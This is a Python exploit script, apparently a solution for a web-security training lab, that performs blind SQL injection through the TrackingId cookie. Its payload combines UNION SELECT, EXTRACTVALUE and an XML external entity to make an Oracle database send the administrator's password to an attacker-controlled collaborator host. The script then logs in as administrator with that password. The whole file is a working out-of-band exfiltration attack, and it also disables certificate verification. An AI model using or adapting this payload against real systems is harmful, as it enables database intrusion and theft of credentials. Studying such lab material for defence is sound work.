import sys
import logging
import urllib3
import urllib.parse

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    sess = requests.Session()
    shop = Shop(args.url, args.no_proxy, sess)
    log.info("Getting tracking id and session token.")
    if args.no_proxy:
        resp = requests.get(shop.base_url)
    else:
        resp = requests.get(shop.base_url, proxies=utils.PROXIES, verify=False)
    tracking_id = resp.cookies["TrackingId"]
    session_token = resp.cookies["session"]
    log.info(f"TrackingId: {tracking_id}")
    exploit = f"{tracking_id}'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.{args.collab}/\">+%25remote%3b]>'),'/l')+FROM+dual--"
    
    cookies = {
        "TrackingId": exploit,
        "session": session_token,
    }
    
    #exploit_encoded = urllib.parse.quote(exploit)
    #cookies = {
    #    "TrackingId": exploit_encoded,
    #    "session": session_token,
    #}    
    log.info("Sending exploit")
    if args.no_proxy:
        resp = requests.get(shop.base_url, cookies=cookies)
    else:
        resp = requests.get(
            shop.base_url, cookies=cookies, proxies=utils.PROXIES, verify=False
        )
        
    password = input("Enter password: ")
    shop.login("administrator", password)        
    shop.is_solved()
        
if __name__ == "__main__":
    args=utils.parse_args_collab(sys.argv)
    main(args)